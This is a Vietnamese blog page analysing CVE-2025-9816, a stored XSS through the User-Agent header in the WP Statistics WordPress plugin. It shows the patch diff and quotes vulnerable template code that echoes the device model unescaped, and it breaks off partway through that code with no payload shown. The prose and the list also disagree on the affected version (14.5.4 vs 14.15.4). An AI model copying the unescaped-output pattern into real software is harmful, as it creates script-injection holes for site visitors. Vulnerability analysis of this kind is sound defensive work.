<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="vi">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-9816 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in WordPress WP Statistics Plugin."><meta name="keywords" content='analyst, plugin, xss'>
  <meta itemprop="name" content="CVE-2025-9816 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in WordPress WP Statistics Plugin.">
  <meta itemprop="datePublished" content="2025-10-08T13:57:00+07:00">
  <meta itemprop="dateModified" content="2025-10-27T01:40:34+07:00">
  <meta itemprop="wordCount" content="4062">
  <meta itemprop="image" content="http://localhost:1313/posts/2025-10-08-cve-2025-9816/app.png">
  <meta itemprop="keywords" content="Analyst,Plugin,Xss"><meta property="og:url" content="http://localhost:1313/vi/posts/2025-10-08-cve-2025-9816/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2025-9816 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in WordPress WP Statistics Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-10-08T13:57:00+07:00">
    <meta property="article:modified_time" content="2025-10-27T01:40:34+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Xss">
    <meta property="og:image" content="http://localhost:1313/posts/2025-10-08-cve-2025-9816/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2025-10-08-cve-2025-9816/app.png">
  <meta name="twitter:title" content="CVE-2025-9816 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress WP Statistics Plugin.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/vi/posts/2025-10-08-cve-2025-9816/" title="CVE-2025-9816 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/vi/posts/2025-10-07-cve-2025-6832/" title="CVE-2025-6832 Analysis &amp; POC" /><link rel="next" type="text/html" href="http://localhost:1313/vi/posts/2025-10-09-cve-2024-4439/" title="CVE-2024-4439 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/vi/posts/2025-10-08-cve-2025-9816/index.md" title="CVE-2025-9816 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-9816 Analysis \u0026 POC",
    "inLanguage": "vi",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/vi\/posts\/2025-10-08-cve-2025-9816\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, xss","wordcount":  4062 ,
    "url": "http:\/\/localhost:1313\/vi\/posts\/2025-10-08-cve-2025-9816\/","datePublished": "2025-10-08T13:57:00+07:00","dateModified": "2025-10-27T01:40:34+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in WordPress WP Statistics Plugin."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="Đổi chủ đề">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li><li class="menu-item language-switch">
            <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><a href="/posts/2025-10-08-cve-2025-9816/" class="menu-link" title="English">English</a></li><li class="menu-item"><span class="text-secondary" title="Vietnamese">Vietnamese</span></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Huỷ
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span><span class="menu-system-item language-switch">
              <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ">Vietnamese<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select class="language-select" onchange="location = this.value;"><option value="/posts/2025-10-08-cve-2025-9816/">English</option><option value="/vi/posts/2025-10-08-cve-2025-9816/" selected disabled>Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Nội dung liên quan</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/vi/posts/2025-10-10-cve-2025-5062/" title="CVE-2025-5062 Analysis &amp; POC">CVE-2025-5062 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-06-cve-2025-10647/" title="CVE-2025-10647 Analysis &amp; POC">CVE-2025-10647 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-04-cve-2025-62065/" title="CVE-2025-62065 Analysis &amp; POC">CVE-2025-62065 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-03-cve-2025-2940/" title="CVE-2025-2940 Analysis &amp; POC">CVE-2025-2940 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-02-cve-2025-1043/" title="CVE-2025-1043 Analysis &amp; POC">CVE-2025-1043 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-01-cve-2025-52713/" title="CVE-2025-52713 Analysis &amp; POC">CVE-2025-52713 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-31-cve-2025-60161/" title="CVE-2025-60161 Analysis &amp; POC">CVE-2025-60161 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-30-cve-2025-11128/" title="CVE-2025-11128 Analysis &amp; POC">CVE-2025-11128 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-28-cve-2025-6851/" title="CVE-2025-6851 Analysis &amp; POC">CVE-2025-6851 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-09-cve-2024-4439/" title="CVE-2024-4439 Analysis &amp; POC">CVE-2024-4439 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-9816 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Tác giả" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;trong <a href="/vi/categories/cve-analyst/" class="post-category" title="Danh mục - CVE Analyst"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analyst</a></span></div><div class="post-meta-line"><span title="đăng ngày 2025-10-08 13:57:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-10-08">2025-10-08</time></span>&nbsp;<span title="Cập nhật ngày 2025-10-27 01:40:34"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-10-27">2025-10-27</time></span>&nbsp;<span title="4062 từ"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>Khoảng 4100 từ</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>20 phút</span>&nbsp;</div>
    </div><div class="featured-image"><img src='/posts/2025-10-08-cve-2025-9816/app.png' alt="/posts/2025-10-08-cve-2025-9816/app.png"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Nội dung</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#patch-diff">Patch diff</a></li>
        <li><a href="#vulnerable-code">Vulnerable code</a></li>
        <li><a href="#sources--sinks">Sources &amp; Sinks</a></li>
        <li><a href="#flow">Flow</a></li>
      </ul>
    </li>
    <li><a href="#exploit">Exploit</a>
      <ul>
        <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="cve--basic-info"><span>CVE &amp; Basic Info</span>
  <a href="#cve--basic-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><strong>WP Statistics – The Most Popular Privacy-Friendly Analytics Plugin</strong> cho WordPress mắc lỗ hổng <strong>Stored Cross-Site Scripting (XSS)</strong> qua <strong>User-Agent Header</strong> trong tất cả các phiên bản từ trước đến <strong>14.5.4</strong> (bao gồm cả 14.5.4). Nguyên nhân xuất phát từ việc <strong>kiểm tra và lọc dữ liệu đầu vào</strong> cũng như <strong>thoát dữ liệu đầu ra</strong> chưa đầy đủ.</p>
<p>Lỗ hổng này cho phép <strong>kẻ tấn công không cần xác thực</strong> chèn các đoạn mã JavaScript độc hại vào hệ thống. Các đoạn mã này sẽ được thực thi mỗi khi người dùng truy cập vào trang có chứa dữ liệu đã bị chèn mã độc, gây ra nguy cơ nghiêm trọng cho bảo mật và quyền riêng tư.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-9816"target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-9816</a></li>
<li><strong>Vulnerability Type</strong>: Cross Site Scripting (XSS)</li>
<li><strong>Affected Versions</strong>: &lt;= 14.15.4</li>
<li><strong>Patched Versions</strong>: 14.15.5</li>
<li><strong>CVSS severity</strong>: Medium (7.1)</li>
<li><strong>Required Privilege</strong>: Unauthenticated</li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/wp-statistics/"target="_blank" rel="external nofollow noopener noreferrer">WordPress WP Statistics Plugin</a></li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>Local WordPress &amp; Debugging</strong>: <a href="https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/"target="_blank" rel="external nofollow noopener noreferrer">Local WordPress and Debugging</a>.</li>
<li><strong>Plugin versions</strong> - <strong>WP Statistics</strong>: <strong>v14.15.4</strong> (vulnerable) và <strong>v14.15.5</strong> (patched).</li>
<li><strong>Diff tool</strong> - <a href="https://meldmerge.org/"target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.</li>
</ul>
<h2 class="heading-element" id="analysis"><span>Analysis</span>
  <a href="#analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Tôi đã thiếu sót trong quá trình thu thập thông tin về CVE này, <a href="https://plugins.trac.wordpress.org/browser/wp-statistics/tags/14.15.3/includes/admin/templates/pages/devices/models.php#L31"target="_blank" rel="external nofollow noopener noreferrer">references</a> của <a href="https://www.cve.org/CVERecord?id=CVE-2025-9816"target="_blank" rel="external nofollow noopener noreferrer">https://www.cve.org/CVERecord?id=CVE-2025-9816</a> chỉ rõ nơi lỗ hỗng xảy ra: <code>includes/admin/templates/pages/devices/models.php</code>{: .filepath}</p>
<p>Nhưng tôi đã bỏ qua nó và sử dụng <a href="https://meldmerge.org/"target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> để so sánh code. Do code thay đổi khá nhiều nên tôi đã chủ động tìm các file liên quan đến <strong>user-agent</strong></p>
<figure><img src="/posts/2025-10-08-cve-2025-9816/dif1.png"
    alt="Diff — so sánh thay đổi mã giữa bản vulnerable và bản vá"><figcaption>
      <p>Diff — so sánh thay đổi mã giữa bản vulnerable và bản vá</p>
    </figcaption>
</figure>

<p>Và code thay đổi trong <code>UserAgent.php</code>{: .filepath} làm tôi tin rằng lỗ hỗng thực sự xảy ra ở đây.</p>
<figure><img src="/posts/2025-10-08-cve-2025-9816/dif2.png"
    alt="Diff — Sự thay đổi mã trong UserAgent.php"><figcaption>
      <p>Diff — Sự thay đổi mã trong UserAgent.php</p>
    </figcaption>
</figure>

<p>Nó làm tôi tốn khá nhiều thời gian nhưng chưa thể phân tích được. Tuy nhiên, việc này cũng giúp ích cho quá trình phân tích.</p>
<p>🍀 May mắn thay, dưới sự hướng dẫn của các tiền bối, tôi đã <strong>focus</strong> vào đúng vào <a href="https://plugins.trac.wordpress.org/browser/wp-statistics/tags/14.15.3/includes/admin/templates/pages/devices/models.php#L31"target="_blank" rel="external nofollow noopener noreferrer"><strong>vị trí lỗ hổng</strong></a>. Nên quá trình phân tích trở nên dễ dàng hơn.</p>
<blockquote>
<p>Tip: Đây là lỗ hổng Cross Site Script diễn ra ở trình duyệt của nạn nhân nên ta cần tìm nơi render và trả về HTML.</p>
</blockquote>
<h3 class="heading-element" id="patch-diff"><span>Patch diff</span>
  <a href="#patch-diff" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Lỗ hổng xảy ra trong file <code>includes/admin/templates/pages/devices/models.php</code>{: .filepath} tại dòng 31.</p>
<p>Trong phiên bản <strong>vulnerable</strong>, <code>$item-&gt;model</code> được in ra HTML nhưng <strong>không có cơ chế bảo vệ nào</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">span</span> <span class="na">title</span><span class="o">=</span><span class="s">&#34;&lt;?php echo \WP_STATISTICS\Admin_Template::unknownToNotSet($item-&gt;model); ?&gt;&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;wps-model-name&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="cp">&lt;?php echo self::isUnknown($item-&gt;model) ? esc_html__(&#39;Unknown&#39;, &#39;wp-statistics&#39;) : $item-&gt;model; ?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Trong phiên bản <strong>patched</strong>, <code>$item-&gt;model</code> đã được bảo vệ bằng cách đặt nó vào <code>esc_attr()</code> và <code>esc_html()</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">span</span> <span class="na">title</span><span class="o">=</span><span class="s">&#34;&lt;?php echo esc_attr(\WP_STATISTICS\Admin_Template::unknownToNotSet($item-&gt;model)); ?&gt;&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;wps-model-name&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="cp">&lt;?php echo self::isUnknown($item-&gt;model) ? esc_html__(&#39;Unknown&#39;, &#39;wp-statistics&#39;) : esc_html($item-&gt;model); ?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>👉 Bản vá bổ sung lớp lọc đầu vào cho <code>$item-&gt;model</code>, đảm bảo nó sẽ được <strong>escape</strong> trước khi in ra HTML.</p>
<figure><img src="/posts/2025-10-08-cve-2025-9816/dif3.png"
    alt="Diff — Sự thay đổi mã trong models.php"><figcaption>
      <p>Diff — Sự thay đổi mã trong models.php</p>
    </figcaption>
</figure>

<h3 class="heading-element" id="vulnerable-code"><span>Vulnerable code</span>
  <a href="#vulnerable-code" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="cp">use WP_STATISTICS\Helper;
</span></span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;postbox-container wps-postbox-full&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="cp">&lt;?php if (!empty($data[&#39;visitors&#39;])) : ?&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;o-table-wrapper&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="p">&lt;</span><span class="nt">table</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;100%&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;o-table wps-new-table&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">              <span class="p">&lt;</span><span class="nt">thead</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">              <span class="p">&lt;/</span><span class="nt">thead</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">              <span class="p">&lt;</span><span class="nt">tbody</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                  <span class="cp">&lt;?php foreach ($data[&#39;visitors&#39;] as $item) : ?&gt;</span>
</span></span><span class="line"><span class="cl">                      <span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                          <span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;wps-pd-l&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                              <span class="p">&lt;</span><span class="nt">span</span> <span class="na">title</span><span class="o">=</span><span class="s">&#34;&lt;?php echo \WP_STATISTICS\Admin_Template::unknownToNotSet($item-&gt;model); ?&gt;&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;wps-model-name&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                                  <span class="cp">&lt;?php echo self::isUnknown($item-&gt;model) ? esc_html__(&#39;Unknown&#39;, &#39;wp-statistics&#39;) : $item-&gt;model; ?&gt;</span>
</span></span><span class="line"><span class="cl">                              <span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                          <span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                      <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                  <span class="cp">&lt;?php endforeach; ?&gt;</span>
</span></span><span class="line"><span class="cl">              <span class="p">&lt;/</span><span class="nt">tbody</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="cp">&lt;?php else : ?&gt;</span>
